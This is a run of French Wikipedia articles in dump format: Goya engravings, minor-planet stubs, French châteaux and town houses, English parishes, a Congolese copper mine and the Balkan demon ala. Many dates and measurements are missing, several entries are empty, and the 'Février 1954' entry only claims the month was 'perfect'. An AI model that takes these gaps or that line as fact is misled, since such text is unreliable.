Il existe divers manuscrits contemporains qui expliquent les planches des Caprichos. Celui qui se trouve au Musée du Prado est considéré comme un autographe de Goya, mais semble plutôt chercher à dissimuler et à trouver un sens moralisateur qui masque le sens plus risqué pour l'auteur. Deux autres, celui qui appartient à Ayala et celui qui se trouve à la Bibliothèque nationale, soulignent la signification plus décapante des planches.
À la fin du , il existait à Madrid un engouement pour les bals masqués. Les nobles des grandes maisons célébraient de cette manière leurs anniversaires. Goya a pu y assister, par exemple, à la Casa de Alba, où ils se déroulaient avec une grande somptuosité. Les masques étaient faits par les sculpteurs les plus fameux, comme les 32 qu'a conçus Pedro Michel pour une fête dans ce palais.
Comme l'affirme André Malraux, le masque pour Goya n'est pas ce qui cache le visage humain mais plutôt ce qui le démasque. 
Goya en profite pour comparer et critiquer les préjugés et les hypocrisies de la comédie de la vie au travers de cette représentation d'un carnaval.
Technique de la gravure.
Dans le dessin préparatoire à la sanguine, conservée au Musée du Prado, la précieuse porte un masque au lieu d'un loup. Les personnages de la Comédie italienne de Polichinelle et du Docteur sont assez différents entre la gravure et le dessin où ne figure pas le personnage à mi-corps sur la gauche. Dans l'angle supérieur gauche, au crayon : « 2 ». Dans l'angle inférieur gauche, à plume, au crayon : « 16 ». Dans l'angle inférieur droit, à plume, encre brune : « 91 ». Le dessin préparatoire mesure .
La plaque est conservée en assez bon état, quoique les creux soient un peu endommagés. L'estampe mesure sur une feuille de papier de .

</doc>
<doc id="7280097" url="https://fr.wikipedia.org/wiki?curid=7280097" title="(1202) Marina">
(1202) Marina

(1202) Marina est un astéroïde de la ceinture principale extérieure découvert le par l'astronome russe Grigori Neujmin. Il a été nommé en hommage à sa collaboratrice Marina Davidovna Lavrova-Berg.
Historique.
Le lieu de découverte, par l'astronome russe Grigori Neujmin, est Simeis (094).
Sa désignation provisoire, lors de sa découverte le , était 1931 RL.
Caractéristiques.
Sa distance minimale d'intersection de l'orbite terrestre est de .

</doc>
<doc id="7280098" url="https://fr.wikipedia.org/wiki?curid=7280098" title="Stade Tchernomorets">
Stade Tchernomorets



</doc>
<doc id="7280100" url="https://fr.wikipedia.org/wiki?curid=7280100" title="Patriarcat d'Éthiopie">
Patriarcat d'Éthiopie

Le patriarcat d'Éthiopie (en latin : "") est une ancienne église particulière de l'Église catholique en Éthiopie.
Érigé au en soutien à la Mission jésuite de réconciliation de l'Eglise copte avec l'Église de Rome et leur retour au catholicisme, le patriarcat ne compta jamais que quelques milliers de fidèles latins en Éthiopie, dont une majorité de portugais d'origine. Il est supprimé en 1636.

</doc>
<doc id="7280104" url="https://fr.wikipedia.org/wiki?curid=7280104" title="(1236) Thaïs">
(1236) Thaïs

(1236) Thaïs est un astéroïde de la ceinture principale découvert le par l'astronome russe Grigori Neujmin.
Historique.
Le lieu de découverte, par l'astronome russe Grigori Neujmin, est Simeis (094).
Sa désignation provisoire, lors de sa découverte le , était 1931 VX.
Caractéristiques.
Sa distance minimale d'intersection de l'orbite terrestre est de .

</doc>
<doc id="7280106" url="https://fr.wikipedia.org/wiki?curid=7280106" title="(1255) Schilowa">
(1255) Schilowa

(1255) Schilowa est un astéroïde de la ceinture principale découvert le par l'astronome russe Grigori Neujmin. Il a été nommé en hommage à l'astronome russe Maria Jilova.
Historique.
Le lieu de découverte, par l'astronome russe Grigori Neujmin, est Simeis (094).
Sa désignation provisoire, lors de sa découverte le , était 1932 NC.

</doc>
<doc id="7280108" url="https://fr.wikipedia.org/wiki?curid=7280108" title="Charlotte Berton">
Charlotte Berton

Charlotte Berton, née le à Rodez, est une pilote automobile française de rallyes.
Biographie.
Lauréate "Rallye Jeunes" en 2005 (même sélection que Sébastien OGIER), elle est sacrée quadruple championne de France féminine des rallyes (2010-2012, 2014).

</doc>
<doc id="7280109" url="https://fr.wikipedia.org/wiki?curid=7280109" title="Westland (Commune)">
Westland (Commune)



</doc>
<doc id="7280110" url="https://fr.wikipedia.org/wiki?curid=7280110" title="Westland (Région)">
Westland (Région)



</doc>
<doc id="7280113" url="https://fr.wikipedia.org/wiki?curid=7280113" title="(4420) Alandreev">
(4420) Alandreev

(4420) Alandreev est un astéroïde de la ceinture principale découvert le à Simeis par l'astronome Grigoriy N. Neujmin.
Caractéristiques.
Sa distance minimale d'intersection de l'orbite terrestre est de .

</doc>
<doc id="7280114" url="https://fr.wikipedia.org/wiki?curid=7280114" title="Château de Besne">
Château de Besne

Le château de Besne se dresse sur la commune de Saint-Péreuse dans le département de la Nièvre en région Bourgogne-Franche-Comté.
Ce château du a été construit après la destruction du château féodal lors des affrontements entre Charles de Téméraire et Louis XI (probablement entre 1474 et 1475). Ce château féodal se situait à l'ouest du château actuel, près de l'église du village. De ce premier château il ne reste que deux pans de murs.
Au titre des monuments historiques, les façades, les toitures et les caves voûtées font l'objet d'une inscription par arrêté du ; les communs (écurie et vacherie), la maison du gardien, le chenil, le colombier, en totalité ainsi que le mur situé dans la cour avec sa tourelle, le puits, le portail et la grille, le jardin et les murs de clôture font l'objet d'une inscription par arrêté du .
Situation.
Le château de Besne est situé dans le département de la Nièvre, au lieu-dit Vignes de Besne, sur la commune de Saint-Péreuse, sur une colline dominant un vaste panorama du Bazois, à de Château-Chinon sur la RD 11.
Histoire.
Le château de Besne a été construit à l'emplacement d'une construction existante dont il ne reste que les caves datées probablement du . Ces caves ne représentent qu'environ un tiers de la surface au sol du château actuel.
Le nom de Besne apparaît au lorsque Guillaume de Grandrye, écuyer, acquiert la terre de Saint-Péreuse et y fait construire le château.
Description.
Le château de Besne comprend deux corps de logis construits en équerre et garde, avec ses quatre tours un aspect médiéval.
Le logis situé au nord, flanqué au levant d'une tour ronde avec canonnières et fentes de visées, est la partie la plus ancienne. Avec ses murs très épais percés par des baies hautes et étroites, il comprend une salle voûtée en berceau. Dans l'alignement de la façade, on voit en son centre une bretèche qui surplombait une porte qui ouvrait sur la cour intérieure. De ce côté, les ouvertures des baies sont à croisillons de pierre, les deux pièces du rez-de-chaussée, voûtées en berceau, comportent des plafonds à la française avec cheminées monumentales du . Le bâtiment fut allongé en direction du levant afin de placer un escalier desservant les étages. Le rez-de-chaussée comporte deux pièces à voûtes en berceau.
La tour de l'Horloge est en demi-hors œuvre du bâtiment.
Un bâtiment à deux corps, en retour d'équerre du logis initial, date de la fin du , l'un d'eux est flanqué de deux tours, percées de meurtrières. Un beau salon de style Restauration occupe le rez-de-chaussée de ce bâtiment, dont un couloir voûté relie ce bâtiment à l'autre bâtiment en retour d'équerre. Les façades de ses deux corps de bâtiment sont percées de fenêtres à croisillons surmontées d'arcs en accolade du côté cour.
L'étage de combles est garni de lucarnes.
Au sous-sol, les deux caves sont plus anciennes. Elles sont probablement du , restes d'un autre édifice. Un pilier central supporte les voûtes d'ogives dans chacune des caves.

</doc>
<doc id="7280115" url="https://fr.wikipedia.org/wiki?curid=7280115" title="Journée du 21 juillet 2013 en Belgique">
Journée du 21 juillet 2013 en Belgique



</doc>
<doc id="7280116" url="https://fr.wikipedia.org/wiki?curid=7280116" title="Mai 1954">
Mai 1954



</doc>
<doc id="7280119" url="https://fr.wikipedia.org/wiki?curid=7280119" title="(3761) Romanskaïa">
(3761) Romanskaïa

(3761) Romanskaïa est un astéroïde de la ceinture principale découvert le à Simeis (094) par l'astronome russe Grigori Néouïmine.
Historique.
Sa désignation provisoire, lors de sa découverte le , était 1936 OH et il est définitivement nommé en l'honneur de l'astronome soviétique Sofia Romanskaïa.
Caractéristiques.
Sa distance minimale d'intersection de l'orbite terrestre est de .

</doc>
<doc id="7280122" url="https://fr.wikipedia.org/wiki?curid=7280122" title="Tram-train du Médoc">
Tram-train du Médoc



</doc>
<doc id="7280128" url="https://fr.wikipedia.org/wiki?curid=7280128" title="(1859) Kovalevskaïa">
(1859) Kovalevskaïa

(1859) Kovalevskaïa (désignation internationale "(1859) Kovalevskaya") est un astéroïde de la ceinture principale extérieure découvert le par l'astronome russe Lioudmila Jouravliova.
Historique.
L'astéroïde fut découvert par l'astronome Lioudmila Jouravliova à Nauchnyj le . Sa désignation provisoire était puis il fut nommé en l'honneur de la mathématicienne russe Sofia Kovalevskaïa.

</doc>
<doc id="7280130" url="https://fr.wikipedia.org/wiki?curid=7280130" title="Oenothera deflexa">
Oenothera deflexa

Oenothera deflexa, l'Onagre à petites fleurs, est une espèce de plantes à fleurs de la famille des Onagracées. C'est une plante herbacée.
Le genre "Oenothera" est originaire d'Amérique. À la suite de mutations et d'hybridations, de nouvelles espèces ont pris naissance en Europe. Le traitement taxonomique en résultant est difficile ; le nombre de taxons reconnus et leur niveau hiérarchique sont différents d'un auteur à l'autre.
Environ d"'Oenothera" ont été décrites, or seule une vingtaine seraient valides. "Oenothera deflexa" est une espèce en cours de validation.
Étymologie.
« "Oenothera" » : du grec "oinos" (vin) et "thêr" (animaux sauvages) : on disait que la racine d’onagre trempée dans du vin était apte à apprivoiser les animaux sauvages.

</doc>
<doc id="7280132" url="https://fr.wikipedia.org/wiki?curid=7280132" title="Tommy Blackstock">
Tommy Blackstock

Thomas (Tommy) Blackstock était un joueur de football écossais. Il était habituellement placé en position de défenseur sur le terrain. Il est né à Kirkcaldy en 1882. Il a joué dans différents clubs au cours de sa carrière : Dunniker Rangers, Manchester United, Blue Bell FC, Raith Rovers, Leith Athletic, et Cowdenbeath. Il est décédé le sur le terrain avec son équipe de Manchester United face à St Helens. Il a tapé un ballon de la tête avant de tomber à terre.
Buckley et la mort de Blackstock.
L'enquête qui a eu lieu à propos de sa mort a rendu un verdict de "causes naturelles", mais Franck Buckley qui était un joueur se trouvant près de lui lors de sa mort pensait lui plutôt que Blackstock est mort d'une crise cardiaque.

</doc>
<doc id="7280137" url="https://fr.wikipedia.org/wiki?curid=7280137" title="(1215) Boyer">
(1215) Boyer

(1215) Boyer est un astéroïde de la ceinture principale découvert le par l'astronome français Alfred Schmitt.
Historique.
Le lieu de découverte, par l'astronome français Alfred Schmitt, est Alger.
Sa désignation provisoire, lors de sa découverte le , était 1932 BA et il est définitivement nommé en l'honneur de l'astronome français Louis Boyer.

</doc>
<doc id="7280144" url="https://fr.wikipedia.org/wiki?curid=7280144" title="(1177) Gonnessia">
(1177) Gonnessia

(1177) Gonnessia est un astéroïde de la ceinture principale extérieure découvert à Alger le par l'astronome français Louis Boyer.
Historique.
Sa désignation provisoire, lors de sa découverte le , était 1930 WA et il est définitivement nommé en l'honneur de l'astronome français François Gonnessiat.
Caractéristiques.
Sa distance minimale d'intersection de l'orbite terrestre est de .

</doc>
<doc id="7280147" url="https://fr.wikipedia.org/wiki?curid=7280147" title="Kim Seong-su">
Kim Seong-su

Kim Seong-su (김성수 ) est un réalisateur, producteur et scénariste coréen, né le à Séoul.

</doc>
<doc id="7280148" url="https://fr.wikipedia.org/wiki?curid=7280148" title="(1191) Alfaterna">
(1191) Alfaterna

(1191) Alfaterna est un astéroïde de la ceinture principale découvert le par l'astronome italien Luigi Volta.
Il a été nommé d'après le nom de la cité étrusque Nuceria Alfaterna qui correspond de nos jours aux villes italiennes Nocera Inferiore et Nocera Superiore.
Historique.
Le lieu de découverte, par l'astronome italien Luigi Volta, est Pino Torinese.
Sa désignation provisoire, lors de sa découverte le , était 1931 CA.
Caractéristiques.
Sa distance minimale d'intersection de l'orbite terrestre est de .

</doc>
<doc id="7280152" url="https://fr.wikipedia.org/wiki?curid=7280152" title="Avril 1954">
Avril 1954



</doc>
<doc id="7280153" url="https://fr.wikipedia.org/wiki?curid=7280153" title="(1238) Predappia">
(1238) Predappia

(1238) Predappia est un astéroïde de la ceinture principale découvert le par l'astronome italien Luigi Volta. Son nom provient du village de Predappio en Émilie-Romagne.
Historique.
Le lieu de découverte, par l'astronome italien Luigi Volta, est l'Observatoire astronomique de Turin à Pino Torinese.
Sa désignation provisoire, lors de sa découverte le , était 1932 CA.

</doc>
<doc id="7280155" url="https://fr.wikipedia.org/wiki?curid=7280155" title="(1332) Marconia">
(1332) Marconia

(1332) Marconia est un astéroïde de la ceinture principale découvert le par l'astronome italien Luigi Volta. Il a été nommé en l'honneur de Guglielmo Marconi.
Historique.
Le lieu de découverte, par l'astronome italien Luigi Volta, est Pino Torinese.
Sa désignation provisoire, lors de sa découverte le , était 1934 AA.

</doc>
<doc id="7280157" url="https://fr.wikipedia.org/wiki?curid=7280157" title="Hôtel Daumesnil">
Hôtel Daumesnil

Lhôtel Daumesnil est un hôtel particulier situé à Caen. Il a été construit au sur la nouvelle place royale (actuelle place de la République, ). Il est inscrit au titre des monuments historiques une première fois le et une seconde fois le .
Situation.
L'hôtel est situé dans le centre-ville ancien de Caen. Il occupe l'angle sud-ouest de la place de la République, à l'angle avec la rue Georges Lebret.
Il occupe une série de parcelles entre cette place et le boulevard Maréchal-Leclerc.
&lt;mapframe latitude="49.180607" longitude="-0.363669" zoom="18" width="357" height="435" align="center"&gt;
 "type": "FeatureCollection",
 "features": [
 "type": "Feature",
 "properties": {},
 "geometry": {
 "type": "Polygon",
 "coordinates": [
 [
 -0.363995,
 49.180733
 [
 -0.363676,
 49.180858
 [
 -0.363321,
 49.180482
 [
 -0.363561,
 49.180318
 [
 -0.363618,
 49.180323
 ]
 ]
&lt;/mapframe&gt;
Histoire.
L'hôtel est construit par un riche marchand, Gaspard Daumesnil, vers 1657-1658 dans la partie sud de la toute nouvelle place Royale, grande place carrée entourée de maisons construites en pierre de taille sur un alignement déterminé. Le coût est estimé à livres.
Un procès est intenté contre la construction du fait du non-respect des règles de construction imposée pour la nouvelle place. À la mort de Gaspard Daumesnil revient à Louis Lecoutelier qui le vend en 1762 à Claude-Olivier Renoult d'Argouges. À la Révolution, l'hôtel est scindé en deux parties.
En 1927, l'hôtel est inscrit à l'inventaire supplémentaire des monuments historiques. L'année suivante, Alexandre-Ludovic Laumonnier, président honoraire du tribunal de Loudun, décède et lègue à la ville la partie de l'hôtel situé au (aile sur la rue Lebret) à condition d'en faire un musée, ce qui ne fut jamais fait malgré l'apposition d'une plaque « musée Laumonnier ». En 1932, la rue Georges-Lebret est percée entre la place de la République et le boulevard des Alliés (actuel boulevard Maréchal-Leclerc), venant le long de l'hôtel, à l'emplacement des jardins. En 1939, Louis-Édouard Garrido, conservateur du musée des beaux-arts, souhaite y ouvrir un musée destiné aux peintres locaux, mais la guerre empêche le projet d'aboutir. L'édifice abrite successivement le bureau du chômage, les services de police et la distribution des cartes d'alimentation. Après 1944, les locaux servent provisoirement de bibliothèque et de dépôt des œuvres du musée. Le tribunal d'instance et le conseil des prud'hommes s'y installe à partir de 1954. La communauté d'agglomération Caen la Mer loue des locaux au .
Le tribunal d'instance est transféré en 2015 dans le nouveau palais de justice construit sur la presqu'île portuaire. Le 28 septembre 2015, le ministère de la justice qui bénéficiait de la mise à disposition des locaux restitue les locaux à la Ville&lt;ref name="C-2024-11-04/31"&gt;&lt;/ref&gt;. Les locaux sont laissés vide.
La Ville met en place une consultation en mai 2022 dans l'objectif de vendre les locaux lui appartenant (parcelles KW2 et KW5). Afin de permettre la cession, les locaux sont déclarés désaffectés et déclassés du domaine public en novembre 2024. Treize entreprises ont répondu à la consultation et le choix se porte finalement entre deux finalistes : la société civile immobilière Beauregard et la société LP 18 / SOTRIM. Cette dernière est déjà propriétaire des bâtiments et du jardin bordant le boulevard Maréchal-Leclerc (parcelles KW64 à 66). L'opération aurait pu donc porter sur une partie plus importante de l'ancien hôtel. La société LP 18 propose ainsi dans son offre la construction de nouveaux volumes bâtis &lt;ref name="C-2024-12-16/12"&gt;&lt;/ref&gt; sur le foncier lui appartenant et dans le prolongement des deux ailes de l'hôtel Daumesnil. Cette proposition n'a pas été jugée compatible avec le caractère patrimonial de l'hôtel et l'enjeu de mise en valeur et d'ouverture de sa cour intérieur. En décembre de 2024, le conseil municipal vote la cession des locaux à la SCI Beauregard au prix de 2,3 millions d'euros. Celle-ci doit y aménager un local à usage de bureaux et dix-neuf logements . Le projet, conçu par les architectes Aurélien Dufour (Agence BDF – architecte du Patrimoine) et Constance Rocher (Architecte DPLG pour la maîtrise d’œuvre d’exécution), prévoit la restauration des façades, la conservation des toitures et des charpentes, le maintien des circulations et logiques distributives de l'immeuble afin de conserver les caractéristiques originelles de l’ensemble. Le petit bâtiment sur deux niveaux situé au fond de la cour en retour d'équerre de l'aile sur la rue Lebret, abritant la chaufferie, doit être démoli. La cour commune, partagée par plusieurs propriétaires, doit également être mise en valeur. La promesse de vente doit être signée en janvier ou février 2025 pour une vente effective prévue en novembre 2026. Les travaux doivent commencer en novembre 2027 afin de livrer le bâtiment fin 2029.
Architecture.
La façade est en pierre de taille (pierre de Caen) sur quatre niveaux (rez-de-chaussée, deux étages et combles sous toits à forte pente) au-dessus d’une cave. Les bâtiments forment un U autour d'une cour centrale avec des jardins qui s'étendaient autrefois jusqu'à la Noë, affluent de l'Orne recouvert en 1860 (actuel boulevard Maréchal-Leclerc). La cour est accessible depuis la place par une porte cochère placée au milieu du bâtiment. Les combles sont éclairés par des lucarnes alternant deux types : chien-assis et œil-de-bœuf. La parfaite symétrie de la façade sur la place est rompue par la cheminée, qui ne se trouve pas au milieu, mais décalée vers l'ouest.
L'hôtel Daumesnil est inscrit au titre des monuments historiques depuis le . Cet arrêté est remplacé le par un nouvel arrêté d'inscription plus précis. Sont protégés :

</doc>
<doc id="7280160" url="https://fr.wikipedia.org/wiki?curid=7280160" title="Journal d'une femme en blanc (roman)">
Journal d'une femme en blanc (roman)

Le Journal d'une femme en blanc est un roman de André Soubiran. Le premier tome du roman a été publié en 1963, et le second en 1964. Un film en a été tiré par Claude Autant-Lara l'année suivante, en 1965, également sous le titre "Journal d'une femme en blanc".
Résumé du tome 1.
Claude Sauvage a fait son internat à l’hôpital de Gennevilliers en 1960. Sa thèse de doctorat traite des conséquences de la contraception. Elle s'attache à une femme ayant contracté un tétanos post abortum mais elle meurt malgré les soins. Claude ne veut pas se marier, son métier sera son mari. Lachaux, médecin qui l'a encadrée pendant son internat, vient la voir en vacances et lui déclare sa flamme mais elle le repousse.
Analyse et contexte.
L’œuvre s'inscrit dans la période précédant 1968, alors que le planning familial commence à apparaître, avec la création en 1962 du collège des médecins du Planning familial, parfois qualifié de coup de force symbolique. Le roman contribue lui-même à sensibiliser l'opinion publique à ces questions, tout particulièrement au travers du film qui en est tiré en 1965 par Claude Autant-Lara, mais que la télévision ne diffusera pas avant 1973, deux ans avant la loi Veil sur l'interruption volontaire de grossesse.

</doc>
<doc id="7280162" url="https://fr.wikipedia.org/wiki?curid=7280162" title="René Drouin (homonymie)">
René Drouin (homonymie)



</doc>
<doc id="7280165" url="https://fr.wikipedia.org/wiki?curid=7280165" title="(1577) Reiss">
(1577) Reiss

(1577) Reiss est un astéroïde de la ceinture principale découvert le à Alger par l'astronome français Louis Boyer.
Historique.
Sa désignation provisoire, lors de sa découverte le , était 1949 BA et il est définitivement nommé en l'honneur de l'astronome français Guy Reiss.
Caractéristiques.
Sa distance minimale d'intersection de l'orbite terrestre est de .

</doc>
<doc id="7280166" url="https://fr.wikipedia.org/wiki?curid=7280166" title="Imprudence (Maupassant)">
Imprudence (Maupassant)

Imprudence est une nouvelle de Guy de Maupassant, parue en 1885.
Historique.
Signée Maufrigneuse, "Imprudence" est une nouvelle écrite par Guy de Maupassant et publiée initialement dans le quotidien "Gil Blas" du , avant d'être reprise dans le recueil "Monsieur Parent".
Résumé.
Commençant à se lasser l'un de l'autre après leur mariage, Henriette demande à Paul de l'emmener dans un cabaret où se donnent des rendez-vous galants...

</doc>
<doc id="7280168" url="https://fr.wikipedia.org/wiki?curid=7280168" title="Mars 1954">
Mars 1954



</doc>
<doc id="7280169" url="https://fr.wikipedia.org/wiki?curid=7280169" title="Towcester">
Towcester

Towcester ( ) est une ville et une paroisse civile du Northamptonshire, en Angleterre. Elle est située dans l'autorité unitaire du West Northamptonshire, sur la rivière , à au sud-ouest de la ville de Northampton. Au moment du recensement de 2011, elle comptait .
À l'époque romaine, elle est connue sous le nom de "Lactodurum". Elle est traversée par la voie romaine de Watling Street. Son nom actuel vient du vieil anglais "Tófe-ceaster", « fort romain sur la Tove ».

</doc>
<doc id="7280171" url="https://fr.wikipedia.org/wiki?curid=7280171" title="Ni así la distingue">
Ni así la distingue

L'eau-forte Ni así la distingue (en français "Même ainsi, il ne la distingue pas") est une gravure de la série "Los caprichos" du peintre espagnol Francisco de Goya. Elle porte le numéro sept dans la série des 80 gravures. Elle a été publiée en 1799.
Interprétations de la gravure.
Il existe divers manuscrits contemporains qui expliquent les planches des Caprichos. Celui qui se trouve au Musée du Prado est considéré comme un autographe de Goya, mais semble plutôt chercher à dissimuler et à trouver un sens moralisateur qui masque le sens plus risqué pour l'auteur. Deux autres, celui qui appartient à Ayala et celui qui se trouve à la Bibliothèque nationale, soulignent la signification plus décapante des planches.
Technique de la gravure.
Il y a deux dessins préparatoires, conservés au Musée du Prado, le premier à l'encre de Chine, appartient à l'album B et est d'une exécution détaillée. Le couple a derrière lui une jeune femme debout qui sur la gravure apparaît assise. Ce premier dessin est intitulé : « "Joven mirando con un anteojo a una maja" ». Le premier dessin préparatoire mesure . Dans la marge supérieure droite du support principal, au pinceau, encre de Chine : « 19 ». Dans la marge inférieure gauche du , au crayon : « 5 y 6 ». Dans la marge inférieure du , centré : « 1ª idea dela estampa nº. / Ni así la distingue ».
Sur le second dessin réalisé à l'encre de noix de galle, il est écrit au crayon : « Por haberle yo dicho que tenía buen movimiento no puede hablar sin colear » ("Pour lui avoir dit qu'il avait un bon mouvement, il ne peut parler sans se trémousser"). Apparaissent diverses personnes et un édifice au fond qu'il a supprimé sur la gravure, même si le couple principal est fidèlement reproduit. Sur la gravure est reproduite le haut du dessin qui se concentre entre l'homme et la jeune femme. Le second dessin préparatoire mesure . Dans la marge supérieure, au crayon : « 21 ». Dans l'angle supérieur droit, trois traits de plume. Dans la marge inférieure, au crayon : le titre ; à côté, au crayon : « N III ». Dessous, à gauche, au crayon : « nº 7 ».
Goya a utilisé l'eau-forte, l'aquatinte et la pointe sèche. Cette gravure est une des rares que le peintre a signées, toujours au coin inférieur gauche. L'estampe mesure sur une feuille de papier de .

</doc>
<doc id="7280172" url="https://fr.wikipedia.org/wiki?curid=7280172" title="(4086) Podalire">
(4086) Podalire

(4086) Podalire (désignation internationale "Podalirius") est un astéroïde troyen de Jupiter découvert le par l'astronome Lioudmila Jouravliova.
Historique.
L'astéroïde a été découvert par l'astronome Lioudmila Jouravliova à Nauchnyj le . Sa désignation provisoire était .

</doc>
<doc id="7280173" url="https://fr.wikipedia.org/wiki?curid=7280173" title="Louis Le Barillier">
Louis Le Barillier

Louis Le Barillier est un homme politique français né le à Caen (Calvados) et mort le à Genillé (Indre-et-Loire).
Biographie.
Propriétaire terrien, opposant à la Restauration et à la Monarchie de Juillet, il est député du Calvados de 1848 à 1849, siégeant à gauche.

</doc>
<doc id="7280174" url="https://fr.wikipedia.org/wiki?curid=7280174" title="(18106) Blume">
(18106) Blume

(18106) Blume est un astéroïde Amor découvert le par le programme LONEOS à la station Anderson Mesa.
Caractéristiques.
Sa distance minimale d'intersection de l'orbite terrestre est de .

</doc>
<doc id="7280175" url="https://fr.wikipedia.org/wiki?curid=7280175" title="Jovana Stevanović">
Jovana Stevanović

Jovana Stevanović est une joueuse de volley-ball serbe née le à Belgrade. Elle mesure et joue au poste de centrale. Elle totalise en équipe de Serbie.

</doc>
<doc id="7280178" url="https://fr.wikipedia.org/wiki?curid=7280178" title="Tempsford">
Tempsford

Tempsford est un village et une paroisse civile du Bedfordshire, en Angleterre. Il est situé dans l'autorité unitaire du Central Bedfordshire, à environ au nord de la ville de Sandy sur la route A1. Au moment du recensement de 2011, il comptait .
Les Danois d'Est-Anglie y établissent un burh en 917, mais ils sont vaincus peu après par le roi du Wessex Édouard l'Ancien. Durant la Seconde Guerre mondiale, le village abrite une base aérienne de la Royal Air Force.

</doc>
<doc id="7280182" url="https://fr.wikipedia.org/wiki?curid=7280182" title="Mine de l'Étoile">
Mine de l'Étoile

La mine de l'Étoile - aussi appelée l’étoile du Congo - est une mine à ciel ouvert de cuivre située près de la ville de Lubumbashi dans la province de Katanga en République démocratique du Congo (RDC). Elle appartient à 95 % à Shalina Resources et à 5 % au gouvernement de la RDC.
Le projet comprend aussi la mine de Ruashi, l'usine de concentration de minerai des mines de Ruashi ainsi qu'une usine de traitement moderne par extraction électrolytique par solvant (SX-EW).

</doc>
<doc id="7280184" url="https://fr.wikipedia.org/wiki?curid=7280184" title="Février 1954">
Février 1954

Le mois de février 1954 était un mois parfait.

</doc>
<doc id="7280186" url="https://fr.wikipedia.org/wiki?curid=7280186" title="Pierre Demortreux">
Pierre Demortreux

Pierre Demortreux est un homme politique français né le à Magny-la-Campagne et mort le à Honfleur.
Biographie.
Fils de Laurent Demortreux, député du Calvados, il est licencié en droit en 1822. En 1830, il est nommé président du tribunal de Lisieux. Conseiller général, il est sous-commissaire du gouvernement à Lisieux en . Il est député du Calvados de 1848 à 1849, siégeant à gauche. Il retrouve ses fonctions de président du tribunal de Lisieux de 1849 à 1856.

</doc>
<doc id="7280187" url="https://fr.wikipedia.org/wiki?curid=7280187" title="The Expendables 3">
The Expendables 3



</doc>
<doc id="7280188" url="https://fr.wikipedia.org/wiki?curid=7280188" title="Ala (démon)">
Ala (démon)

Une ala, ou hala (pluriel : ale ou hali), est une créature mythologique féminine présente dans le folklore bulgare, macédonien et serbe. Les ale sont considérés comme les démons du mauvais temps dont le principal but est de conduire des nuages de grêle vers des champs, des vignobles ou des vergers afin de détruire les récoltes. Extrêmement voraces, les ale aiment particulièrement manger les enfants, bien que leur gloutonnerie ne soit pas limitée qu'à la Terre. Il est dit qu'ils essayent parfois de dévorer le Soleil ou la Lune, provoquant ainsi des éclipses. Lorsque des individus rencontrent une ala, leur santé mentale ou physique, ou même leur vie, est en péril. Cependant, il est possible de gagner leur faveur en les approchant avec respect et confiance. Être en bons termes avec une ala est très avantageux, puisqu'elle rend ses favoris riches et sauve leurs vies en temps de conflit.
L'apparence des ale est décrite dans le folklore de manière diverse et vague. Une ala peut très bien ressembler à un souffle noir, une gigantesque créature à forme confuse, un monstre à grande bouche, de forme humaine ou serpentine, un dragon femelle, ou un corbeau. Une ala peut prendre une forme humaine ou animale, et peut même s'emparer du corps d'une personne. Il est dit que la diversité des apparences décrites est due au fait que cette créature soit (ou est) une synthèse du démon slave du mauvais temps et d'un démon similaire du centre des Balkans remontant à une population pré-slave. Dans les contes populaires contenant une ala de forme humaine, celle-ci a une personnalité similaire à celle de la Baba Yaga russe. Il est dit que les ale vivent dans les nuages ou dans un lac, une source, un endroit reculé, une forêt, une montagne inhospitalière, ou un arbre gigantesque. En plus des humains, les ale ont aussi d'autres ennemis puissants qui peuvent les vaincre, tels que les dragons. Dans les récits christianisés, saint Élie prend le rôle du dragon. Dans certains cas, saint Élie et les dragons combattent les ale ensemble. Les aigles aussi, en chassant les ale des champs, les empêchent d'y amener des nuages de grêle.
Origine et analogies.
Alors que certains êtres mythologiques sont communs à tous les groupes ethniques slaves, les ale ne semblent appartenir qu'aux folklores bulgare, macédonien et serbe. Toutefois, d'autres groupes ethniques slaves ont aussi des démons du mauvais temps. Parmi les Slaves de l'Est, on peut citer Baba Yaga, qui fut imaginée comme étant une sorcière à grande stature avec un gros nez, des dents de fer, et un menton protubérant. Il était dit qu'elle mangeait des enfants, et que sa présence apportait des orages et un temps froid. Le terme baba est présent dans les coutumes, croyances et toponymes de tous les peuples slaves, généralement en tant que personnification du vent, de l'obscurité et de la pluie. Ceci amène quelques érudits à penser qu'il y avait une divinité ou un démon proto-slave appelée Baba, associé au mauvais temps.
Dans certains contes populaires slaves orientaux, il est aussi fait mention d'un Tourbillon (Bихрь, "Vikhr’") qui a notamment pour coutume d'enlever les princesses. Il est plus ou moins assimilé à un dragon ou un autre monstre ailé.
Apparence.
Un démon ressemblant à un dragon ou un serpent, en relation avec le vent, ainsi que les orages et les nuages de grêle. Dans la Gruža, région de Serbie centrale, on croyait que la ala était invisible, mais qu'elle pouvait être entendue – son sifflement résonnant à l'avant des nuages de grêle noirs.
En Bulgarie orientale, les ale n'apparaissent pas dans les nuages, mais dans les coups de vent violents et les tornades. Dans d'autres régions de la Bulgarie, les ale étaient vues soit comme « un taureau avec d'énormes cornes, un nuage noir, un brouillard sombre ou un monstre d'allure serpentine avec six ailes et vingt queues ».
Les Serbes du Kosovo croient que les ale abaissent leur queues sur le sol et cachent leur tête dans les nuages. Quiconque avait vu sa tête devenait instantanément fou. Un haut-relief au-dessus d'une fenêtre de l'église du monastère de Visoki Dečani, représente un aigle agrippant une ala aux allures de serpent pendant qu'un aiglon observe. Selon une description provenant de la partie est de la Serbie, les ale sont de très grandes créatures avec un corps de serpent et une tête de cheval. Une idée répandue stipule que les ale sont les sœurs des dragons et qu'elles leur ressemblent plus ou moins. Dans un écrit provenant de la partie est de la Serbie, les ale sont décrites comme étant des serpents à trois têtes.
Selon une description provenant de la région de Boljevac, en Serbie, les ale sont des créatures horribles et noires sous forme de vent. De la même façon, dans l'Homolje, région de Serbie, les gens imaginent les ale comme étant un vent noir se déplaçant au-dessus des terres. Où qu'elles aillent, une tornade apparait, tournant comme une perceuse. Ceux qui sont exposés à cette tornade deviennent fous. De la même manière, en Bulgarie, une ala est un vent violent qui balaye tout sur son passage et apporte le chaos.
Une croyance de Leskovac, ville serbe, affirme que les ale sont des monstres possédant une énorme bouche et tenant dans leur main une grande cuillère en bois, avec laquelle elles saisissent et dévorent tout ce qu'elles trouvent sur leur chemin. Une histoire raconte qu'un homme a gardé une ala de ce genre dans sa grange ; elle aurait bu trente litres de lait par jour. Une autre histoire met en garde contre les ale qui, sous la forme de douze corbeaux, avaient l'habitude de prendre les récoltes des vignobles.
